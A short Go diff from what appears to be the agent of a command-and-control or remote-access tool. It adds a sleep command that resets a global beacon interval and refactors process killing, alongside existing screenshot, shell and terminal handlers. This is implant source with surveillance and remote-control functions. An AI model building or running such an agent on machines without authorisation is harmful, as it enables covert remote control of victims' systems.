@@ -105,6 +105,9 @@ func TaskProcess(commands [][]byte) [][]byte {
 		case utils.COMMAND_SCREENSHOT:
 			data, err = taskScreenshot()
 
+		case utils.COMMAND_SLEEP:
+			data, err = taskSleep(command.Data)
+
 		case utils.COMMAND_TERMINAL_START:
 			jobTerminal(command.Data)
 
@@ -298,12 +301,7 @@ func taskKill(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	proc, err := os.FindProcess(params.Pid)
-	if err != nil {
-		return nil, err
-	}
-
-	err = proc.Signal(syscall.SIGKILL)
+	err = functions.KillProcess(params.Pid)
 	return nil, err
 }
 
@@ -448,6 +446,24 @@ func taskScreenshot() ([]byte, error) {
 	}
 
 	return msgpack.Marshal(utils.AnsScreenshots{Screens: screens})
+}
+
+func taskSleep(paramsData []byte) ([]byte, error) {
+	var params utils.ParamsSleep
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return nil, err
+	}
+
+	if params.Seconds < 1 {
+		return nil, fmt.Errorf("sleep time must be at least 1 second")
+	}
+
+	// 修改全局profile的SleepTime
+	// Modify global profile SleepTime
+	profile.SleepTime = params.Seconds
+
+	return msgpack.Marshal(utils.AnsSleep{Seconds: params.Seconds})
 }
 
 func taskShell(paramsData []byte) ([]byte, error) {
